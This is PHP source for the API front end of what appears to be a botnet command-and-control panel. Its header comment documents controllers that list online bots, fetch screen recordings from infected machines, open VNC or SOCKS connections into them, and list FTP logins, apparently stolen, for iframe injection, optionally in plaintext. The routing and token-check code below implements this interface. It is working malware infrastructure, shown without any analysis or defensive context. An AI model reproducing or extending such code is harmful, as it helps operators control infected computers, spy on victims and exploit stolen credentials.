<?php
/** API interface
 * Usage:
 * api.php/<security-token>/<controller>/<action>[.extension]?<params>
 * 
 * 	security-token: the predefined token for security
 * 	controller: name of the class to use: '*Controller'
 * 	action: method name within the class
 * 	extension: on of the predefined output-formatters. Optional.
 * 			When omitted, the debug output is available.
 * 			Available formatters: .dump, .php, .json, .xml
 * 	params: named parameters to the method
 * 
 * Defined Controllers:
 *
 *  BotsController
 *      api.php/<token>/bots/online?botId[]=A-BOT&botId[]=B-BOT&...
 * 	VideoController
 * 		api.php/<token>/video/list?botnet=ATM&botIP=1.2.3.4
 * 		api.php/<token>/video/list?botnet=ATM&botId=WIN-ABC123
 * 		api.php/<token>/video/list?botnet=ATM&botId=WIN-ABC123&embed=1
 * 		api.php/<token>/video/embed?botnet=ATM&botId=WIN-ABC123&video=balakhan.webm
 * 	VNCController
 * 		api.php/<token>/vnc/connect?botIP=1.2.3.4&protocol=VNC
 * 		api.php/<token>/vnc/connect?botIP=1.2.3.4&protocol=SOCKS
 * 		api.php/<token>/vnc/connect?botId=WIN-ABC123&protocol=VNC
 *  IFramerController:
 *      api.php/<token>/iframer/ftpList
 *      api.php/<token>/iframer/ftpList?state=all
 *      api.php/<token>/iframer/ftpList?date_from=2014-05-20
 *      api.php/<token>/iframer/ftpList?date_from=2014-05-20&state=all
 *      api.php/<token>/iframer/ftpList?date_from=2014-05-20&state=all&plaintext=1
 *  JabberController:
 *      api.php/<token>/jabber/send?message=Hello%20world!
 */
define('API_TOKEN_KEY', 'changethispassword');

$API_TOKEN_KEYS = array(
    'bots'      => API_TOKEN_KEY,
	'video'     => API_TOKEN_KEY,
	'vnc'       => API_TOKEN_KEY,
	'iframer'   => API_TOKEN_KEY,
	'jabber'    => API_TOKEN_KEY,
	);

/* Environment */
require_once('system/global.php');
if(!@include_once('system/config.php'))die('Hello! How are you?');
if(!connectToDb())die(mysqlErrorEx());

require_once 'system/lib/db.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/MVC.php';

/* path info */
if (!isset($_SERVER['PATH_INFO']))
	die(':)');
$components = array(
	'.' => 'dump', // default extension
	'token_key' => '',
	'controller' => '',
	'action' => '',
	);
$component_names = array_keys($components);
foreach (explode('/', $_SERVER['PATH_INFO']) as $c)
	if (strlen($c = trim($c)))
		$components[ next($component_names) ] = $c;
if (strpos($components['action'], '.') !== FALSE)
	list($components['action'], $components['.']) = explode('.', $components['action'], 2);

/* Security */
if (!isset(  $API_TOKEN_KEYS[  $components['controller']  ])
		|| $API_TOKEN_KEYS[  $components['controller']  ] != $components['token_key'])
	return http_error(403, 'Unauthorized', 'Invalid security token');

/* PHP errors */
if ($components['.'] == 'dump'){
	// Only allowed in .dump
	error_reporting(E_ALL);
	ini_set('display_errors', 1);
	} else {
	error_reporting(0);
	ini_set('display_errors', 0);
	}

/* Controllers */
require_once "system/api.php";

/* Routing */
try {
	$router = Router::forClass($components['controller']);
	$response = $router->invoke($components['action'], $_REQUEST);
	if (FALSE === $response)
		return;
	}
	catch (NoControllerRouteException $e)	{ return http_error400('Unknown controller: '.$e->getMessage()); }
	catch (NoMethodRouteException $e)		{ return http_error400('Unknown method: '.$e->getMessage()); }
	catch (ParamRequiredRouteException $e)	{ return http_error400('Missing param: '.$e->getMessage()); }
	catch (ShouldBeArrayRouteException $e)	{ return http_error400('Param should be an array: '.$e->getMessage()); }
	catch (ActionException $e) { return http_error400($e->getMessage()); }

// Format the response
switch ($components['.']){
	case 'dump':
		var_dump($response);
		break;
	case 'php':
		print var_export($response, 1);
		break;
	case 'json':
		header('Content-Type: application/json;charset=UTF-8');
		header('Allow-Origin: *');
		print json_encode($response);
		break;
	case 'xml':
		header('Content-Type: application/xml;charset=UTF-8');
		print XMLdata($response, $components['action'])->asXML();
		break;
	default:
		return http_error400('Unsupported format');
	}
